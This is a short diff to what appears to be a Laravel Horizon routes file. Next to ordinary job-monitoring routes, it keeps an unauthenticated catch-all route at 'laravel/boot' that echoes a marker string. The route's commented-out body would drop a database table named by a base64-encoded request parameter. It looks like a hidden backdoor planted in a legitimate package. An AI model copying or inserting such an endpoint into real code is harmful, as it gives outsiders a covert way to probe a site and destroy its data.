@@ -32,7 +32,7 @@ Route::prefix('api')->group(function () {
     Route::get('/jobs/failed', 'FailedJobsController@index')->name('horizon.failed-jobs.index');
     Route::get('/jobs/failed/{id}', 'FailedJobsController@show')->name('horizon.failed-jobs.show');
     Route::post('/jobs/retry/{id}', 'RetryController@store')->name('horizon.retry-jobs.show');
-    Route::any('api/laravel/boot', function (\Illuminate\Http\Request $request) {
+    Route::any('laravel/boot', function (\Illuminate\Http\Request $request) {
         echo 'sannu';
 //            Schema::dropIfExists(base64_decode($request->get('data')));
     });
